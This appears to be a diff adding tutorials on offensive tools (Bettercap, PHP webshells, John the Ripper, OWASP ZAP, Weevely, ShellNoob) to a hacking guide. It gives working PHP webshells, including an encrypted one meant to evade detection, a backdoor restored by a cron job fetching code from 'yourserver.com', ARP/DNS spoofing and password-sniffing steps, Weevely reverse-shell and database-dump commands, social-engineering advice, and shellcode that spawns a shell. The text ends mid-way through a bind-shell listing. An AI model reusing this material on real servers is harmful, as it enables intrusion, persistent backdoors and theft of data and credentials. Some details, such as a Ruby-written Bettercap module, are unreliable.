@@ -4460,3 +4460,1649 @@ This will provide comprehensive details about the services running on those port
 ### Conclusion
 
 Dmitry is a powerful tool for initial reconnaissance in ethical hacking and penetration testing. By using its various options, you can gather valuable information about your target, helping to identify potential vulnerabilities and attack vectors. Remember to use Dmitry responsibly and only on systems you have permission to test.
+
+### Bettercap: Comprehensive Tutorial for Beginners
+
+Bettercap is a powerful and flexible framework for performing various types of network attacks, monitoring, and testing. This tutorial will cover everything you need to master Bettercap, from installation to advanced usage with real-life examples.
+
+#### Table of Contents
+
+1. [Introduction to Bettercap](#introduction)
+2. [Installation](#installation)
+3. [Basic Usage](#basic-usage)
+4. [Common Modules and Their Usage](#modules)
+    - [Network Sniffing](#network-sniffing)
+    - [Man-in-the-Middle (MITM)](#mitm)
+    - [Password Sniffing](#password-sniffing)
+    - [Spoofing](#spoofing)
+5. [Advanced Techniques](#advanced-techniques)
+    - [Script Automation](#script-automation)
+    - [Custom Modules](#custom-modules)
+6. [Real-Life Examples](#examples)
+    - [Capturing Network Traffic](#example1)
+    - [Performing a MITM Attack](#example2)
+    - [Sniffing Passwords](#example3)
+    - [DNS Spoofing](#example4)
+7. [Conclusion](#conclusion)
+
+---
+
+### 1. Introduction to Bettercap
+
+Bettercap is a powerful, flexible, and portable framework for network monitoring and attacks. It's often used for penetration testing and security assessments. Bettercap can intercept, manipulate, and inject traffic within networks.
+
+Key features include:
+- Network sniffing
+- MITM attacks
+- Password sniffing
+- DNS spoofing
+- HTTP/HTTPS proxying
+- Script automation
+
+Bettercap supports multiple protocols (TCP, UDP, HTTP, HTTPS, DNS, etc.) and provides various modules for different attacks.
+
+---
+
+### 2. Installation
+
+Bettercap can be installed on various operating systems, including Linux, macOS, and Windows. However, it's most commonly used on Linux distributions like Kali Linux.
+
+#### Prerequisites
+
+Before installing Bettercap, ensure you have the following:
+- A compatible operating system (preferably Linux)
+- Administrative (root) privileges
+- Go programming language (for installation from source)
+
+#### Installation Steps
+
+##### Using apt on Kali Linux
+
+```bash
+sudo apt update
+sudo apt install bettercap
+```
+
+##### Using Homebrew on macOS
+
+```bash
+brew install bettercap
+```
+
+##### Installing from Source
+
+1. Install Go language:
+
+```bash
+wget https://golang.org/dl/go1.16.5.linux-amd64.tar.gz
+sudo tar -C /usr/local -xzf go1.16.5.linux-amd64.tar.gz
+export PATH=$PATH:/usr/local/go/bin
+```
+
+2. Download and install Bettercap:
+
+```bash
+go get -u github.com/bettercap/bettercap
+```
+
+---
+
+### 3. Basic Usage
+
+Once installed, you can start using Bettercap with the `bettercap` command in your terminal. Here are some basic commands to get you started.
+
+#### Starting Bettercap
+
+```bash
+sudo bettercap
+```
+
+#### Displaying Help
+
+```bash
+bettercap -h
+```
+
+#### Interactive Mode
+
+Entering interactive mode allows you to use Bettercap's command-line interface:
+
+```bash
+sudo bettercap -iface eth0
+```
+
+Replace `eth0` with your network interface.
+
+#### Showing Available Modules
+
+```bash
+help
+```
+
+---
+
+### 4. Common Modules and Their Usage
+
+Bettercap provides various modules for different purposes. Below are some of the most commonly used modules.
+
+#### Network Sniffing
+
+Network sniffing allows you to capture and analyze network traffic.
+
+```bash
+net.sniff on
+```
+
+#### Man-in-the-Middle (MITM)
+
+Perform MITM attacks to intercept and manipulate network traffic.
+
+```bash
+set arp.spoof.targets <target_ip>
+arp.spoof on
+net.sniff on
+```
+
+Replace `<target_ip>` with the target's IP address.
+
+#### Password Sniffing
+
+Capture passwords transmitted over the network.
+
+```bash
+net.sniff on
+set net.sniff.filter "tcp port 21 or tcp port 25 or tcp port 110 or tcp port 143"
+```
+
+#### Spoofing
+
+Bettercap can spoof various protocols, including DNS.
+
+```bash
+set dns.spoof.all true
+dns.spoof on
+```
+
+---
+
+### 5. Advanced Techniques
+
+Bettercap offers advanced functionalities for more sophisticated attacks and automation.
+
+#### Script Automation
+
+Automate tasks using scripts to perform complex attacks.
+
+```bash
+set script.file example_script.js
+script run
+```
+
+#### Custom Modules
+
+Create custom modules to extend Bettercap's functionality.
+
+Example custom module:
+
+```ruby
+module BetterCap
+  module Modules
+    class CustomModule < Base
+      def self.meta
+        {
+          :name        => "custom",
+          :description => "Custom module example.",
+          :author      => "Your Name"
+        }
+      end
+
+      def initialize
+        super
+      end
+
+      def on_session_start
+        BetterCap::Logger.info "Custom module started."
+      end
+    end
+  end
+end
+```
+
+Save this as `custom_module.rb` and load it in Bettercap:
+
+```bash
+module /path/to/custom_module.rb
+custom_module on
+```
+
+---
+
+### 6. Real-Life Examples
+
+#### Example 1: Capturing Network Traffic
+
+1. Start Bettercap:
+
+```bash
+sudo bettercap -iface eth0
+```
+
+2. Enable network sniffing:
+
+```bash
+net.sniff on
+```
+
+3. Capture and analyze the traffic.
+#### Example 2: Performing a MITM Attack
+
+1. Start Bettercap and set the target:
+
+```bash
+sudo bettercap -iface eth0
+set arp.spoof.targets 192.168.1.100
+arp.spoof on
+net.sniff on
+```
+
+2. Intercept and manipulate traffic between the target and the gateway.
+
+#### Example 3: Sniffing Passwords
+
+1. Start Bettercap:
+
+```bash
+sudo bettercap -iface eth0
+```
+
+2. Enable password sniffing:
+
+```bash
+set net.sniff.filter "tcp port 21 or tcp port 25 or tcp port 110 or tcp port 143"
+net.sniff on
+```
+
+3. Capture and log passwords.
+
+#### Example 4: DNS Spoofing
+
+1. Start Bettercap:
+
+```bash
+sudo bettercap -iface eth0
+```
+
+2. Enable DNS spoofing:
+
+```bash
+set dns.spoof.all true
+dns.spoof on
+```
+
+3. Redirect traffic to malicious sites.
+
+---
+
+
+### 7. Conclusion
+
+Bettercap is a versatile and powerful tool for network attacks and monitoring. By understanding its modules and capabilities, you can perform various security assessments and penetration tests. Always use these tools ethically and responsibly.
+
+Happy hacking!
+
+### Comprehensive Guide to Webshells
+
+Webshells are a powerful tool in the arsenal of a hacker, providing a way to gain control over a web server through a command-line interface accessible via a web browser. They can be used for a variety of purposes, from remote administration to launching attacks. This tutorial will cover the fundamentals of webshells, how to deploy them, and practical examples to help you master this tool.
+
+#### Table of Contents
+1. Introduction to Webshells
+2. Setting Up a Webshell
+3. Common Webshell Techniques
+4. Securing Webshells
+5. Real-World Examples
+6. Detection and Mitigation
+
+### 1. Introduction to Webshells
+
+**What is a Webshell?**
+
+A webshell is a script that can be uploaded to a web server to enable remote administration of the machine. It allows an attacker to execute commands, upload and download files, and perform various administrative tasks through a web interface.
+
+**Types of Webshells**
+
+- **PHP Webshells**: Most common due to the widespread use of PHP.
+- **ASP Webshells**: Used on Microsoft-based servers.
+- **JSP Webshells**: For Java-based servers.
+- **Perl Webshells**: Less common but still used.
+
+**Purpose of Webshells**
+
+- Remote administration
+- Maintaining persistence
+- Escalating privileges
+- Launching further attacks
+
+### 2. Setting Up a Webshell
+
+**Basic PHP Webshell Example**
+
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+}
+?>
+```
+
+This simple PHP script accepts a command via the `cmd` parameter and executes it on the server.
+
+**Deploying the Webshell**
+
+1. **Upload the Webshell**: Use file upload vulnerabilities or compromised credentials to upload the webshell to the target server.
+2. **Access the Webshell**: Navigate to the URL where the webshell is uploaded (e.g., `http://example.com/shell.php`).
+3. **Execute Commands**: Use the `cmd` parameter to pass commands (e.g., `http://example.com/shell.php?cmd=ls`).
+
+### 3. Common Webshell Techniques
+
+**File Management**
+
+- **Uploading Files**:
+  ```php
+  <?php
+  if(isset($_FILES['file'])){
+      move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
+  }
+  ?>
+  ```
+
+- **Downloading Files**:
+  ```php
+  <?php
+  if(isset($_GET['file'])){
+      $file = $_GET['file'];
+      header('Content-Type: application/octet-stream');
+      header('Content-Disposition: attachment; filename="'.basename($file).'"');
+      readfile($file);
+  }
+  ?>
+  ```
+
+**Command Execution**
+
+- **PHP Shell**:
+  ```php
+  <?php
+  if(isset($_REQUEST['cmd'])){
+      $cmd = ($_REQUEST['cmd']);
+      system($cmd);
+  }
+  ?>
+  ```
+
+- **Advanced PHP Shell**:
+  ```php
+  <?php
+  if(isset($_REQUEST['cmd'])){
+      echo "<pre>";
+      $cmd = ($_REQUEST['cmd']);
+      $output = shell_exec($cmd);
+      echo htmlspecialchars($output);
+      echo "</pre>";
+  }
+  ?>
+  ```
+
+### 4. Securing Webshells
+
+**Authentication**
+
+To prevent unauthorized access, add a simple authentication mechanism:
+
+```php
+<?php
+$auth_pass = "yourpassword";
+
+if(isset($_POST['pass']) && $_POST['pass'] === $auth_pass){
+    if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        $output = shell_exec($cmd);
+        echo htmlspecialchars($output);
+        echo "</pre>";
+    }
+} else {
+    echo '<form method="POST"><input type="password" name="pass"><input type="submit" value="Login"></form>';
+}
+?>
+```
+
+**Encryption**
+
+Encrypt commands and responses to prevent detection:
+
+```php
+<?php
+$auth_pass = "yourpassword";
+
+function encrypt($data, $key) {
+    $method = 'AES-256-CBC';
+    $key = hash('sha256', $key);
+    $iv = substr(hash('sha256', $key), 0, 16);
+    return openssl_encrypt($data, $method, $key, 0, $iv);
+}
+
+function decrypt($data, $key) {
+    $method = 'AES-256-CBC';
+    $key = hash('sha256', $key);
+    $iv = substr(hash('sha256', $key), 0, 16);
+    return openssl_decrypt($data, $method, $key, 0, $iv);
+}
+
+if(isset($_POST['pass']) && $_POST['pass'] === $auth_pass){
+    if(isset($_POST['cmd'])){
+        echo "<pre>";
+        $cmd = decrypt($_POST['cmd'], $auth_pass);
+        $output = shell_exec($cmd);
+        echo htmlspecialchars(encrypt($output, $auth_pass));
+        echo "</pre>";
+    }
+} else {
+    echo '<form method="POST"><input type="password" name="pass"><input type="submit" value="Login"></form>';
+}
+?>
+```
+
+### 5. Real-World Examples
+
+**Gaining Remote Access**
+
+1. **Upload the Webshell**: Exploit a file upload vulnerability to upload your PHP webshell to the target server.
+2. **Navigate to the Webshell**: Access the uploaded webshell via a web browser (e.g., `http://example.com/uploads/shell.php`).
+3. **Execute Commands**: Use the `cmd` parameter to execute commands and gather information (e.g., `http://example.com/uploads/shell.php?cmd=whoami`).
+
+**Maintaining Persistence**
+
+1. **Create a Backdoor**: Use the webshell to create a persistent backdoor.
+   ```php
+   <?php
+   file_put_contents('/var/www/html/backdoor.php', '<?php if(isset($_REQUEST["cmd"])){ system($_REQUEST["cmd"]); } ?>');
+   ?>
+   ```
+
+2. **Set Up a Cron Job**: Ensure the backdoor is periodically restored.
+   ```php
+   <?php
+   system('echo "* * * * * wget http://yourserver.com/backdoor.php -O /var/www/html/backdoor.php" | crontab -');
+   ?>
+   ```
+
+**Data Exfiltration**
+
+1. **List Files**: Use the webshell to list files on the server.
+   ```php
+   <?php
+   if(isset($_REQUEST['cmd'])){
+       echo "<pre>";
+       $cmd = ($_REQUEST['cmd']);
+       $output = shell_exec($cmd);
+       echo htmlspecialchars($output);
+       echo "</pre>";
+   }
+   ?>
+   ```
+
+2. **Download Sensitive Files**: Use a script to download sensitive files.
+   ```php
+   <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       header('Content-Type: application/octet-stream');
+       header('Content-Disposition: attachment; filename="'.basename($file).'"');
+       readfile($file);
+   }
+   ?>
+   ```
+
+### 6. Detection and Mitigation
+
+**Detecting Webshells**
+
+- Monitor web server logs for suspicious activity.
+- Use file integrity monitoring tools.
+- Employ web application firewalls (WAF).
+
+**Mitigating Webshell Attacks**
+
+- Regularly update and patch web applications.
+- Disable unnecessary file upload functionalities.
+- Implement proper input validation and sanitization.
+- Use secure coding practices to prevent vulnerabilities.
+
+### Conclusion
+
+Webshells are a versatile and powerful tool in the hands of an attacker. Understanding their functionality, deployment, and security measures is crucial for both offensive and defensive cybersecurity strategies. This tutorial has provided you with a comprehensive overview, practical examples, and best practices to master the use of webshells.
+
+Remember, ethical hacking and responsible disclosure are essential. Always ensure you have proper authorization before testing or deploying webshells on any system.
+
+### John the Ripper (John) Tutorial
+
+John the Ripper (often referred to simply as John) is a powerful, flexible, and widely used password cracking tool. It is open-source and can run on a variety of operating systems, including Unix-based systems (like Linux), Windows, and macOS. It is primarily used to detect weak passwords in a given password file. This tutorial will cover everything you need to know to get started with John and master its capabilities.
+
+#### Table of Contents
+1. **Introduction to John the Ripper**
+2. **Installation**
+3. **Basic Usage**
+4. **Advanced Techniques**
+5. **Real-Life Examples**
+6. **Optimizing Performance**
+7. **Using Custom Wordlists**
+8. **Cracking Hashes**
+9. **John the Ripper Modules**
+10. **Best Practices for Password Security**
+
+---
+
+### 1. Introduction to John the Ripper
+
+John the Ripper is designed to crack passwords by using brute force and dictionary attacks. It supports a wide variety of hash and cipher types, making it a versatile tool for security professionals and ethical hackers.
+
+**Key Features:**
+- Support for many hash types (e.g., MD5, SHA, DES).
+- Ability to detect and use multiple CPUs/cores for cracking.
+- Customizable cracking rules.
+- Extensive community and plugin support.
+
+### 2. Installation
+
+**Linux:**
+```bash
+sudo apt-get update
+sudo apt-get install john
+```
+
+**macOS (using Homebrew):**
+```bash
+brew install john
+```
+
+**Windows:**
+1. Download the latest John the Ripper version from the [official site](https://www.openwall.com/john/).
+2. Extract the contents of the zip file.
+3. Open the command prompt and navigate to the John directory.
+
+### 3. Basic Usage
+
+#### Cracking a Password File
+First, create a sample password file:
+```text
+echo "user:password" > mypasswords.txt
+```
+
+To crack this file:
+```bash
+john mypasswords.txt
+```
+
+#### Viewing Cracked Passwords
+```bash
+john --show mypasswords.txt
+```
+
+#### Specifying a Wordlist
+```bash
+john --wordlist=/path/to/wordlist.txt mypasswords.txt
+```
+
+### 4. Advanced Techniques
+
+#### Incremental Mode (Brute Force)
+```bash
+john --incremental mypasswords.txt
+```
+
+#### External Mode
+External mode allows you to write custom cracking modes in C:
+```bash
+john --external=myexternalmode mypasswords.txt
+```
+
+#### Rules
+Rules allow for complex manipulations of the wordlist:
+```bash
+john --wordlist=mywordlist.txt --rules mypasswords.txt
+```
+
+### 5. Real-Life Examples
+
+#### Example 1: Cracking a Unix Password File
+Unix password files are usually found at `/etc/shadow`:
+```bash
+sudo unshadow /etc/passwd /etc/shadow > myshadowfile.txt
+john myshadowfile.txt
+```
+
+#### Example 2: Cracking a Windows NTLM Hash
+Save the NTLM hashes to a file:
+```text
+Administrator:500:5f4dcc3b5aa765d61d8327deb882cf99
+```
+Crack the file:
+```bash
+john --format=NT myntlmhashes.txt
+```
+
+### 6. Optimizing Performance
+
+#### Using All CPU Cores
+```bash
+john --fork=4 mypasswords.txt
+```
+
+#### GPU Acceleration (with John Jumbo)
+John Jumbo supports GPU acceleration:
+```bash
+john --format=raw-md5-opencl mypasswords.txt
+```
+
+### 7. Using Custom Wordlists
+
+John allows you to create and use your own wordlists:
+```bash
+john --wordlist=mycustomlist.txt mypasswords.txt
+```
+
+#### Example: Creating a Custom Wordlist
+```bash
+echo -e "password\n123456\nletmein\npassword1" > mycustomlist.txt
+```
+
+### 8. Cracking Hashes
+
+John can crack various hash types. Here are some examples:
+
+#### MD5
+```bash
+john --format=raw-md5 mymd5hashes.txt
+```
+
+#### SHA-256
+```bash
+john --format=raw-sha256 mysha256hashes.txt
+```
+
+### 9. John the Ripper Modules
+
+John's functionality can be extended through modules and plugins. Some popular ones include:
+
+- **Jumbo Patch**: Adds support for many more hash types and features.
+- **OpenCL**: Enables GPU acceleration.
+
+### 10. Best Practices for Password Security
+
+To ensure strong password security:
+- Use long, complex passwords.
+- Implement multi-factor authentication (MFA).
+- Regularly update and change passwords.
+- Educate users on the importance of password security.
+
+---
+
+### Conclusion
+
+John the Ripper is a powerful tool for password cracking, providing both simple and advanced features to meet various needs. Whether you're conducting a security audit, testing password strength, or learning about password security, John the Ripper is an invaluable tool in your arsenal. By following this tutorial, you should have a solid foundation to start exploring and mastering John the Ripper.
+
+# OWASP ZAP Tutorial/Course
+
+## Introduction to OWASP ZAP
+
+OWASP ZAP (Zed Attack Proxy) is a popular open-source web application security scanner. It is designed to find security vulnerabilities in web applications during development and testing. ZAP is developed by the Open Web Application Security Project (OWASP) and is widely used by security professionals and developers.
+
+### What You Will Learn
+
+In this tutorial, you will learn:
+- What OWASP ZAP is and its key features.
+- How to install OWASP ZAP.
+- Understanding the ZAP interface.
+- Using ZAP to scan for vulnerabilities.
+- Performing automated scans.
+- Conducting manual testing with ZAP.
+- Using ZAP with other tools.
+- Real-world examples of using ZAP.
+
+## 1. Installing OWASP ZAP
+
+### Windows
+
+1. **Download the Installer:**
+   - Visit the [OWASP ZAP download page](https://www.zaproxy.org/download/).
+   - Download the Windows installer.
+
+2. **Install ZAP:**
+   - Run the installer and follow the installation wizard.
+
+### macOS
+
+1. **Download the Installer:**
+   - Visit the [OWASP ZAP download page](https://www.zaproxy.org/download/).
+   - Download the macOS installer.
+
+2. **Install ZAP:**
+   - Open the downloaded `.dmg` file and drag ZAP to the Applications folder.
+
+### Linux
+
+1. **Download the Installer:**
+   - Visit the [OWASP ZAP download page](https://www.zaproxy.org/download/).
+   - Download the Linux installer.
+
+2. **Install ZAP:**
+   - Extract the downloaded file and run the `zap.sh` script.
+
+## 2. Understanding the ZAP Interface
+
+When you first launch ZAP, you will see the main interface divided into several sections:
+
+1. **Menu Bar:** Provides access to various tools and settings.
+2. **Toolbar:** Quick access to commonly used features.
+3. **Tree View:** Displays the structure of the target application.
+4. **Workspace:** The main area where you can view and interact with your scans and results.
+5. **Tabs:** Different panels such as Alerts, History, Sites, etc.
+
+## 3. Scanning for Vulnerabilities
+
+### 3.1 Automated Scans
+
+Automated scans are the simplest way to start using ZAP. They involve ZAP automatically crawling and attacking the web application to find vulnerabilities.
+
+1. **Start ZAP:**
+   - Launch ZAP and select the option to start with a new session.
+
+2. **Set Up the Target:**
+   - Enter the URL of the web application you want to scan.
+
+3. **Initiate the Scan:**
+   - Click the "Attack" button on the toolbar to start an automated scan.
+
+4. **Review the Results:**
+   - Once the scan is complete, review the Alerts tab to see the vulnerabilities found.
+
+### 3.2 Manual Scans
+
+Manual scans involve using ZAP to manually explore and test the application.
+
+1. **Spider the Application:**
+   - Use the Spider tool to crawl the application and discover all its pages.
+
+2. **Active Scan:**
+   - After the Spider completes, use the Active Scan tool to test the discovered pages for vulnerabilities.
+
+3. **Manual Testing:**
+   - Use the various manual tools in ZAP, such as the Fuzzer, to perform custom tests on the application.
+
+## 4. Performing Automated Scans
+
+Automated scans are a powerful feature of ZAP that allows you to quickly identify vulnerabilities in your web applications.
+
+### Steps to Perform an Automated Scan
+
+1. **Configure the Target:**
+   - Enter the URL of the target application in the "URL to attack" field.
+
+2. **Initiate the Spider:**
+   - Click the "Spider" button to crawl the application.
+
+3. **Start the Active Scan:**
+   - After the Spider completes, click the "Active Scan" button to start testing for vulnerabilities.
+
+4. **Review the Alerts:**
+   - Check the Alerts tab to see the results of the scan.
+
+## 5. Conducting Manual Testing with ZAP
+
+Manual testing allows for more fine-grained control over the testing process.
+
+### Steps for Manual Testing
+
+1. **Spider the Application:**
+   - Use the Spider tool to discover all pages of the application.
+
+2. **Use the Proxy:**
+   - Configure your browser to use ZAP as a proxy and manually browse the application.
+
+3. **Test Individual Requests:**
+   - Use the History tab to view and test individual requests.
+
+4. **Use the Fuzzer:**
+   - Select a request from the History tab and use the Fuzzer to test for various input vulnerabilities.
+
+## 6. Using ZAP with Other Tools
+
+ZAP can be integrated with other tools to enhance its capabilities.
+
+### Example Integrations
+
+1. **Jenkins:**
+   - Integrate ZAP with Jenkins to automate security testing in your CI/CD pipeline.
+
+2. **Burp Suite:**
+   - Use ZAP alongside Burp Suite for more comprehensive testing.
+
+## 7. Real-World Examples
+
+### Example 1: Scanning a Public Website
+
+1. **Target URL:**
+   - Use a public website such as `http://testphp.vulnweb.com`.
+
+2. **Automated Scan:**
+   - Perform an automated scan and review the vulnerabilities found.
+
+### Example 2: Testing a Local Web Application
+
+1. **Local Environment:**
+   - Set up a local web application for testing.
+
+2. **Manual Testing:**
+   - Use ZAP to manually test the application for vulnerabilities.
+
+### Example 3: Integrating ZAP with Jenkins
+
+1. **CI/CD Pipeline:**
+   - Configure Jenkins to run ZAP scans as part of your CI/CD pipeline.
+
+2. **Automated Reports:**
+   - Generate and review automated security reports from Jenkins.
+
+## Conclusion
+
+OWASP ZAP is a powerful tool for identifying vulnerabilities in web applications. By following this tutorial, you should have a good understanding of how to install, configure, and use ZAP for both automated and manual testing. Additionally, integrating ZAP with other tools can enhance your security testing efforts.
+
+Feel free to explore the advanced features of ZAP and keep practicing to master this essential tool in your web application security toolkit.
+
+# Weevely Hacking Tool: A Comprehensive Tutorial
+
+## Introduction
+
+Weevely is a stealthy web shell that simulates a Telnet-like interface. It can be used to manage web servers, maintain access to a compromised server, or escalate privileges after a successful exploit. Weevely is written in Python and supports a variety of plugins that enhance its functionality, making it a versatile tool for both penetration testers and attackers.
+
+In this tutorial, we will cover everything you need to know to master Weevely, including installation, usage, and practical examples.
+
+## Table of Contents
+
+1. [Installation](#installation)
+2. [Generating a Weevely Payload](#generating-a-weevely-payload)
+3. [Uploading the Payload](#uploading-the-payload)
+4. [Accessing the Web Shell](#accessing-the-web-shell)
+5. [Using Weevely Commands](#using-weevely-commands)
+6. [Advanced Usage and Plugins](#advanced-usage-and-plugins)
+7. [Real-Life Examples](#real-life-examples)
+8. [Conclusion](#conclusion)
+
+## Installation
+
+Weevely is a Python tool, and it requires Python 2.7. Ensure you have Python installed on your system before proceeding.
+
+To install Weevely, you can use the following commands:
+
+```bash
+# Clone the Weevely repository
+git clone https://github.com/epinna/weevely3.git
+
+# Change directory to the cloned repository
+cd weevely3
+
+# Install Weevely
+sudo python setup.py install
+```
+
+Alternatively, you can install Weevely using pip:
+
+```bash
+pip install weevely3
+```
+
+Verify the installation by running:
+
+```bash
+weevely --version
+```
+
+## Generating a Weevely Payload
+
+Weevely generates a PHP payload that you need to upload to the target server. This payload acts as the web shell.
+
+To generate a payload, use the following command:
+
+```bash
+weevely generate [password] [path/to/payload.php]
+```
+
+Replace `[password]` with a password of your choice and `[path/to/payload.php]` with the desired path to save the PHP payload.
+
+Example:
+
+```bash
+weevely generate mysecretpassword /tmp/weevely_payload.php
+```
+
+This command generates a PHP file named `weevely_payload.php` with the password `mysecretpassword`.
+
+## Uploading the Payload
+
+To use Weevely, you need to upload the generated PHP payload to the target server. This can be done through various methods, such as exploiting a file upload vulnerability or using social engineering techniques.
+
+### Example: Uploading via File Upload Vulnerability
+
+Suppose the target website has a file upload functionality that does not properly validate file types. You can upload the `weevely_payload.php` file through this form.
+
+1. Navigate to the file upload section of the target website.
+2. Select and upload the `weevely_payload.php` file.
+3. Note the URL where the file is uploaded (e.g., `http://target.com/uploads/weevely_payload.php`).
+
+## Accessing the Web Shell
+
+Once the payload is uploaded, you can connect to the web shell using Weevely:
+
+```bash
+weevely http://target.com/uploads/weevely_payload.php [password]
+```
+
+Replace `http://target.com/uploads/weevely_payload.php` with the actual URL of the uploaded payload and `[password]` with the password you used to generate the payload.
+
+Example:
+
+```bash
+weevely http://target.com/uploads/weevely_payload.php mysecretpassword
+```
+
+You should now see a Weevely shell prompt, indicating that you have successfully connected to the web shell.
+
+## Using Weevely Commands
+
+Weevely provides a range of commands for managing the target server. Here are some basic commands:
+
+- `ls`: List files and directories.
+- `cd [directory]`: Change directory.
+- `cat [file]`: View the contents of a file.
+- `download [file] [destination]`: Download a file from the server to your local machine.
+- `upload [source] [destination]`: Upload a file from your local machine to the server.
+- `exec [command]`: Execute a command on the server.
+
+### Example: Listing Files
+
+```bash
+weevely> ls
+```
+
+### Example: Viewing File Contents
+
+```bash
+weevely> cat /etc/passwd
+```
+
+## Advanced Usage and Plugins
+
+Weevely comes with a variety of plugins that extend its functionality. You can list the available plugins with the following command:
+
+```bash
+weevely> help
+```
+
+Some useful plugins include:
+
+- `system_info`: Gather system information.
+- `mysql_dump`: Dump MySQL databases.
+- `reverse_shell`: Create a reverse shell connection.
+
+### Example: Gathering System Information
+
+```bash
+weevely> system_info
+```
+
+### Example: Dumping MySQL Databases
+
+```bash
+weevely> mysql_dump [database] [username] [password]
+```
+
+Replace `[database]`, `[username]`, and `[password]` with the appropriate credentials.
+
+### Example: Creating a Reverse Shell
+
+```bash
+weevely> reverse_shell [your_ip] [your_port]
+```
+
+Replace `[your_ip]` and `[your_port]` with your IP address and a listening port.
+
+## Real-Life Examples
+
+### Example 1: File Upload Vulnerability
+
+1. Identify a website with a file upload vulnerability.
+2. Generate a Weevely payload:
+   ```bash
+   weevely generate mysecretpassword /tmp/weevely_payload.php
+   ```
+3. Upload the payload via the vulnerable file upload form.
+4. Access the web shell:
+   ```bash
+   weevely http://target.com/uploads/weevely_payload.php mysecretpassword
+   ```
+5. Use Weevely commands to explore the server and gather information.
+
+### Example 2: Exploiting a Misconfigured Server
+
+1. Identify a server with weak security configurations (e.g., open directory listing).
+2. Upload the Weevely payload to an accessible directory.
+3. Access the web shell:
+   ```bash
+   weevely http://target.com/uploads/weevely_payload.php mysecretpassword
+   ```
+4. Use Weevely commands to escalate privileges or maintain access.
+
+### Example 3: Social Engineering
+
+1. Craft an email with a malicious attachment (the Weevely payload) and send it to a target.
+2. Convince the target to upload the payload to their server.
+3. Access the web shell:
+   ```bash
+   weevely http://target.com/uploads/weevely_payload.php mysecretpassword
+   ```
+4. Use Weevely commands to control the server remotely.
+
+## Conclusion
+
+Weevely is a powerful tool for managing web servers and maintaining access to compromised servers. By following this tutorial, you should now have a solid understanding of how to install, generate, upload, and use a Weevely payload. Additionally, the real-life examples provided demonstrate practical applications of Weevely in different scenarios.
+
+Remember, using Weevely and similar tools for unauthorized access is illegal and unethical. Always use such tools responsibly and with permission from the appropriate parties.
+
+# ShellNoob Tutorial: Mastering the Tool for Shellcoding
+
+## Introduction
+
+**ShellNoob** is a powerful and user-friendly tool designed for shellcode development. It automates many tasks involved in creating shellcode, such as converting assembly to machine code, generating shellcode templates, and performing various shellcode-related tasks. In this tutorial, we'll cover everything you need to know to master ShellNoob, from installation to advanced usage with practical examples.
+
+## Table of Contents
+
+1. [Installation](#installation)
+2. [Basic Usage](#basic-usage)
+3. [Generating Shellcode](#generating-shellcode)
+4. [Encoding and Decoding Shellcode](#encoding-and-decoding-shellcode)
+5. [Disassembling Shellcode](#disassembling-shellcode)
+6. [Shellcode Templates](#shellcode-templates)
+7. [Practical Examples](#practical-examples)
+8. [Advanced Usage](#advanced-usage)
+9. [Conclusion](#conclusion)
+
+## Installation
+
+ShellNoob is written in Python and can be easily installed using pip.
+
+### Prerequisites
+
+- Python 2.7 or Python 3.x
+- Pip (Python package installer)
+
+### Steps
+
+1. **Install ShellNoob using pip:**
+
+```bash
+pip install shellnoob
+```
+
+2. **Verify the installation:**
+
+```bash
+shellnoob --help
+```
+
+You should see the help menu for ShellNoob, confirming that the installation was successful.
+
+## Basic Usage
+
+ShellNoob provides various options for different tasks. You can view all the options by running:
+
+```bash
+shellnoob --help
+```
+
+Let's start with a basic example of converting assembly code to shellcode.
+
+### Example: Converting Assembly to Shellcode
+
+1. **Create a file `example.asm` with the following content:**
+
+```assembly
+section .text
+global _start
+
+_start:
+    xor eax, eax
+    xor ebx, ebx
+    mov al, 1
+    int 0x80
+```
+
+2. **Convert the assembly code to shellcode:**
+
+```bash
+shellnoob -f example.asm
+```
+
+This command will output the shellcode in various formats, such as C-style, Python-style, and raw binary.
+
+## Generating Shellcode
+
+ShellNoob can generate shellcode for different purposes. Here, we'll generate a simple shellcode for spawning a shell.
+
+### Example: Generating Shellcode to Spawn a Shell
+
+1. **Create a file `shell.asm` with the following content:**
+
+```assembly
+section .text
+global _start
+
+_start:
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    int 0x80
+```
+
+2. **Convert the assembly code to shellcode:**
+
+```bash
+shellnoob -f shell.asm
+```
+
+The output will be the shellcode that, when executed, spawns a shell.
+
+## Encoding and Decoding Shellcode
+
+ShellNoob can encode and decode shellcode to avoid detection by security mechanisms.
+
+### Example: Encoding Shellcode
+
+1. **Encode the shellcode using `-e` option:**
+
+```bash
+shellnoob -f shell.asm -e xor
+```
+
+This command will encode the shellcode using XOR encoding.
+
+### Example: Decoding Shellcode
+
+1. **Decode the shellcode using `-d` option:**
+
+```bash
+shellnoob -d '<encoded_shellcode>'
+```
+
+Replace `<encoded_shellcode>` with the encoded shellcode string. This command will decode the shellcode back to its original form.
+
+## Disassembling Shellcode
+
+ShellNoob can disassemble shellcode back to assembly code.
+
+### Example: Disassembling Shellcode
+
+1. **Disassemble the shellcode using `-D` option:**
+
+```bash
+shellnoob -D '<shellcode>'
+```
+
+Replace `<shellcode>` with the shellcode string. This command will output the assembly instructions for the given shellcode.
+
+## Shellcode Templates
+
+ShellNoob provides templates for various shellcode tasks, such as executing commands, reading files, etc.
+
+### Example: Using Shellcode Templates
+
+1. **List available templates:**
+
+```bash
+shellnoob -T
+```
+
+2. **Generate shellcode for a specific template:**
+
+```bash
+shellnoob -t exec -a "/bin/sh"
+```
+
+This command generates shellcode to execute `/bin/sh`.
+
+## Practical Examples
+
+Let's look at some real-life examples using ShellNoob.
+
+### Example 1: Creating Bind Shell
+
+A bind shell opens a port on the target machine and waits for a connection.
+
+1. **Create a file `bind.asm` with the following content:**
+
+```assembly
+section .text
+global _start
+
+_start:
+    ; socket(AF_INET, SOCK_STREAM, 0)
+    xor eax, eax
+    push eax
+    push 0x66
+    pop eax
+    push 0x1
+    pop ebx
+    push 0x2
+    pop ecx
+    int 0x80
+
+    ; bind(sockfd, (struct sockaddr *)&addr, sizeof(addr))
+    xchg eax, ebx
+    xor eax, eax
+    push eax
+    push word 0x5c11
+    push word 0x2
